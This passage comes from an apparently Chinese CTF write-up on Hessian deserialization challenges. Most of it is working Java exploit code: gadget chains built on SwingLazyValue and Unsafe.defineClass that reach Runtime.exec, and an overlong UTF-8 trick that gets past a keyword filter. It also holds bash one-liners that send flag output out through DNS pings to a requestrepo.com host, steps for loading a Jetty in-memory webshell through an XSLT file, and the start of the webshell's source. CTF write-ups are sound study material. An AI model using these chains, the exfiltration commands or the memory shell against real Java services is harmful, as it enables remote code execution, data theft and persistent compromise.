<span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class, ClassLoader.class, ProtectionDomain.class);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> f.get(<span class="hljs-literal">null</span>);<br>        Object[] ags = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;invoke, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;defineClass, unsafe, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;new_ClassName, bcode, <span class="hljs-number">0</span>, bcode.length, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;&#125;&#125;;<br><br>        <span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">swingLazyValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;sun.reflect.misc.MethodUtil&quot;</span>, <span class="hljs-string">&quot;invoke&quot;</span>, ags);<br>        <span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">swingLazyValue1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(new_ClassName, <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]);<br><br>        Object[] keyValueList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;abc&quot;</span>, swingLazyValue&#125;;<br>        Object[] keyValueList1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;ccc&quot;</span>, swingLazyValue1&#125;;<br><br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>(keyValueList);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>(keyValueList);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>(keyValueList1);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>(keyValueList1);<br><br>        Hashtable&lt;Object, Object&gt; hashtable1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;();<br>        Hashtable&lt;Object, Object&gt; hashtable2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;();<br>        Hashtable&lt;Object, Object&gt; hashtable3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;();<br>        Hashtable&lt;Object, Object&gt; hashtable4 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;();<br><br>        hashtable1.put(<span class="hljs-string">&quot;a&quot;</span>, uiDefaults1);<br>        hashtable2.put(<span class="hljs-string">&quot;a&quot;</span>, uiDefaults2);<br>        hashtable3.put(<span class="hljs-string">&quot;b&quot;</span>, uiDefaults3);<br>        hashtable4.put(<span class="hljs-string">&quot;b&quot;</span>, uiDefaults4);<br><br><span class="hljs-comment">// åºåˆ—åŒ–</span><br>        <span class="hljs-comment">//String serData = serObj(hashtable1, hashtable2, hashtable3, hashtable4);</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">serData</span> <span class="hljs-operator">=</span> UTF8_serObj(hashtable1, hashtable2, hashtable3, hashtable4);<br>        System.out.println(serData);<br><span class="hljs-comment">// ååºåˆ—åŒ–</span><br>        readObj(serData);<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serObj</span><span class="hljs-params">(Object hashtable1, Object hashtable2, Object hashtable3, Object hashtable4)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">4</span>);<br>        Class&lt;?&gt; nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br>        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">4</span>);<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, hashtable1, hashtable1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, hashtable2, hashtable2, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">2</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, hashtable3, hashtable3, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">3</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, hashtable4, hashtable4, <span class="hljs-literal">null</span>));<br>        setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;hessian.ser&quot;</span>));<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(s);<br>        hessian2Output.close();<br><br>        <span class="hljs-keyword">return</span> java.util.Base64.getEncoder().encodeToString(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(<span class="hljs-string">&quot;hessian.ser&quot;</span>)));<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> String <span class="hljs-title function_">UTF8_serObj</span><span class="hljs-params">(Object hashtable1, Object hashtable2, Object hashtable3, Object hashtable4)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">4</span>);<br>        Class&lt;?&gt; nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br>        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">4</span>);<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, hashtable1, hashtable1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, hashtable2, hashtable2, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">2</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, hashtable3, hashtable3, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">3</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, hashtable4, hashtable4, <span class="hljs-literal">null</span>));<br>        setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>        <span class="hljs-type">Hessian2OutputWithOverlongEncoding</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2OutputWithOverlongEncoding</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;hessian.ser&quot;</span>));<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(s);<br>        hessian2Output.close();<br><br>        <span class="hljs-keyword">return</span> java.util.Base64.getEncoder().encodeToString(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(<span class="hljs-string">&quot;hessian.ser&quot;</span>)));<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObj</span><span class="hljs-params">(String serData)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">byte</span>[] sers = java.util.Base64.getDecoder().decode(serData);<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(sers)).contains(<span class="hljs-string">&quot;java&quot;</span>)) &#123;<br>            System.out.println(<span class="hljs-string">&quot;I hate jvav&quot;</span>);<br>            <span class="hljs-comment">//return;</span><br>        &#125;<br><br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(sers));<br>        <span class="hljs-comment">//Hessian2Input hessian2Input = new Hessian2Input(new FileInputStream(&quot;hessian.ser&quot;));</span><br>        hessian2Input.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250520171548029.png" alt="image-20250520171548029"></p><p>ç„¶è€Œå¯ä»¥çœ‹åˆ°é€šæ˜¯é€šäº†ï¼Œä½†javaæ²¡æœ‰ç»•è¿‡å»ï¼Œè¿™æ˜¯å› ä¸ºåœ¨è¾“å…¥çš„åœ°æ–¹æœ‰ä¸€ä¸ªå¯¹javaå­—ç¬¦ä¸²ç›´æ¥çš„è¿‡æ»¤ï¼Œè¿™é‡Œçš„javaæ˜¯ä¸å¯é¿å…çš„ã€‚åœ¨ <code>unsafe.defineClass</code> çš„ <code>bytecode</code> å†…ï¼Œ<code>bytecode</code> è§£ç çš„å†…å®¹åŒ…å«äº†â€™javaâ€™ï¼Œè¿™éƒ¨åˆ†æ— å…³Hessianååºåˆ—åŒ–ï¼Œè€Œæ˜¯ç±»çš„å­—èŠ‚ç ã€‚</p><p>ä½†æ˜¯çœŸçš„ä¸èƒ½ç»•äº†å—ï¼Ÿå…¶å®ä¸ç„¶ã€‚</p><p>ä¸Šé¢çš„é“¾è·Ÿç€åˆ†æäº†ä»¥åå…¶å®å°±çŸ¥é“åœ¨<code>SwingLazyValue</code>æˆ‘ä»¬å·²å®ç°è°ƒç”¨ä»»æ„æ–¹æ³•ï¼Œæ‰€ä»¥ç›´æ¥è°ƒruntimeå°±è¡Œäº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">swingLazyValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<br>        <span class="hljs-string">&quot;sun.reflect.misc.MethodUtil&quot;</span>,<br>        <span class="hljs-string">&quot;invoke&quot;</span>,<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<br>                MethodUtil.class.getMethod(<span class="hljs-string">&quot;invoke&quot;</span>, Method.class, Object.class, Object[].class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<br>                        Runtime.class.getDeclaredMethod(<span class="hljs-string">&quot;exec&quot;</span>, String[].class),<br>                        Runtime.getRuntime(),<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<br>                                <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<br>                                        isLinux ? <span class="hljs-string">&quot;sh&quot;</span> : <span class="hljs-string">&quot;cmd&quot;</span>,<br>                                        isLinux ? <span class="hljs-string">&quot;-c&quot;</span> : <span class="hljs-string">&quot;/c&quot;</span>,<br>                                        <span class="hljs-string">&quot;calc.exe&quot;</span><br>                                &#125;<br>                        &#125;<br>                &#125;<br>        &#125;<br>);<br></code></pre></td></tr></table></figure><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250520172128284.png" alt="image-20250520172128284"></p><p>ç„¶è€Œè¿™é“é¢˜åªæœ‰dnså‡ºç½‘ï¼Œé‡‡ç”¨æ–‡ç« ä¸­çš„æ“ä½œï¼Œåœ¨æ²¡æœ‰curlçš„æƒ…å†µä¸‹ç”¨pingä»£æ›¿è¾“å‡ºåå…­è¿›åˆ¶ï¼Œç”±äºä¸€æ¬¡åªæœ‰50ä¸ªå­—ç¬¦æ‰€ä»¥è¿˜éœ€è¦å†™ä¸€ä¸ªè¯»å–å50å­—ç¬¦çš„å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot;echo \&quot;<span class="hljs-subst">$(/readflag give me the flag | xxd -p -c 256 | sed &#x27;s/^\\(.\\&#123;50\\&#125;\\)</span>\\(.*\\)$/\\2/&#x27; | sed &#x27;s/^\\(.\\&#123;50\\&#125;\\).*$/\\1/&#x27;).gtg815ph.requestrepo.com\&quot; | xargs ping&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$( /readflag give me the flag | xxd -p -c 256 | sed &#x27;s/^.\&#123;100\&#125;//&#x27; | sed &#x27;s/^\\(.\\&#123;50\\&#125;\\)</span>.*$/\\1/&#x27; ).gtg815ph.requestrepo.com&quot;</span> | xargs ping<br></code></pre></td></tr></table></figure><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250520172353712.png" alt="image-20250520172353712"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250520172418030.png" alt="image-20250520172418030"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250520172425280.png" alt="image-20250520172425280"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250520172432826.png" alt="image-20250520172432826"></p><p>DNSæµé‡æœ‰ç‚¹å¡ï¼Œå¯èƒ½è¦å¤šå‘å‡ æ¬¡åŒ…ã€‚</p><h3 id="hdHessian"><a href="#hdHessian" class="headerlink" title="hdHessian"></a>hdHessian</h3><p>Hessiançš„ç‰ˆæœ¬æé«˜äº†ï¼Œå½»åº•ä¸å‡ºç½‘äº†ï¼ŒLDAPå’ŒJDBCè¿™ç§æƒ³éƒ½åˆ«æƒ³ã€‚è€Œæ–°ç‰ˆæœ¬çš„Hessianç›´æ¥åœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­å¯¹Runtimeã€ProcessImplç­‰ç±»åšäº†é»‘åå•é™åˆ¶ï¼Œä½ ä¹Ÿå‘½ä»¤æ‰§è¡Œä¸äº†ã€‚</p><p>çœ‹åˆ°å®ƒä¾èµ–ä¸­çš„Jettyï¼Œçœ‹æ¥åªèƒ½æ‰“Jettyå†…å­˜é©¬äº†ã€‚</p><p>æ­¤å¤„æ€è·¯è¿˜æ˜¯ç”¨åˆ°ä¸Šé¢åˆ†æä¸­çš„<code>SwingLazyValue</code>ï¼Œä»¤å…¶è°ƒç”¨ç±»åŠ è½½æ¥å®ç°å†…å­˜é©¬çš„æ³¨å…¥ï¼Œå› ä¸ºHessianååºåˆ—åŒ–åªå¯è§ClassLoaderï¼Œå› æ­¤æ— æ³•é™åˆ¶ç±»åŠ è½½æ—¶æœŸåœ¨ClassLoaderå†…çš„Runtimeã€‚</p><p>ä½†å‰é¢æåˆ°ç±»å­—èŠ‚ç ä¼šåŒ…å«â€™javaâ€™å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•å…ˆå°†å­—èŠ‚ç ç¼–ç å¹¶ä¿å­˜ä¸ºæ–‡ä»¶ï¼Œåœ¨ç¬¬äºŒæ¬¡å†å¯¹æ–‡ä»¶è¿›è¡Œè§£ç å’ŒåŠ è½½ã€‚</p><p>è¿™é‡Œè€ƒè™‘åˆ°ä¸€ä¸ªä¼ xsltæ–‡ä»¶çš„æ–¹æ³•ï¼Œä¹Ÿæ˜¯å®˜æ–¹ç»™å‡ºçš„æ–¹æ³•ã€‚</p><p>å½“ç„¶xsltæ–‡ä»¶ä¹Ÿä½¿ç”¨äº†htmlå®ä½“ç¼–ç è½¬ä¹‰æ¥ç»•è¿™ä¸ªjavaçš„æ£€æµ‹ï¼Œå³<code>ja&amp;#x76</code>ã€‚</p><p>å…ˆç”¨è¿™ä¸ª<code>SwingLazyValue</code>è°ƒ<code>com.sun.org.apache.xml.internal.security.utils.JavaUtils#writeBytesToFilename</code>å°†xsltæ–‡ä»¶è½¬æ¢æˆçš„å­—èŠ‚æ ¼å¼å†™å…¥ç›®æ ‡ä½ç½®ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250520174748242.png" alt="image-20250520174748242"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250520174923579.png" alt="image-20250520174923579"></p><p>æ¥ç€è°ƒç”¨<code>com.sun.org.apache.xalan.internal.xslt.Process#_main</code>æ¥åŠ è½½xsltæ–‡ä»¶ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250520175200587.png" alt="image-20250520175200587"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250520175235487.png" alt="image-20250520175235487"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250520175010041.png" alt="image-20250520175010041"></p><p>Jettyå†…å­˜ğŸéšä¾¿æ‰¾ä¸€ä¸ªå°±è¡Œäº†ï¼Œè¿™é‡Œæˆ‘ç”¨å®˜æ–¹çš„payloadç›´æ¥æ‰“äº†ï¼Œå†™çš„æŒºå¥½çš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> exp.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br><span class="hljs-keyword">import</span> java.io.PrintStream;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Array;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br><span class="hljs-keyword">import</span> java.util.ArrayList;  <br><span class="hljs-keyword">import</span> java.util.List;  <br><span class="hljs-keyword">import</span> java.util.zip.GZIPInputStream;<br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JettyFilterMemoryShell</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JettyFilterMemoryShell</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            <span class="hljs-comment">/*  </span><br><span class="hljs-comment">            byte [] bytes = &#123;12,23&#125;; // what ever you want            Unsafe unsafe = Unsafe.getUnsafe();            unsafe.defineAnonymousClass(this.getClass(), bytes, new Object [0]).newInstance();            */</span>  <br>            <span class="hljs-keyword">for</span>(Object context : <span class="hljs-built_in">this</span>.getContext()) &#123;  <br>                <span class="hljs-type">Object</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getShell(context);  <br>                <span class="hljs-built_in">this</span>.inject(context, filter);  <br>            &#125;  <br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;  <br>            e.printStackTrace();  <br>        &#125;  <br>  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getUrlPattern</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;/*&quot;</span>;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getClassName</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;org.eclipse.jetty.servlet.handlers.XXRGa.OAuthFilter&quot;</span>;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getBase64String</span><span 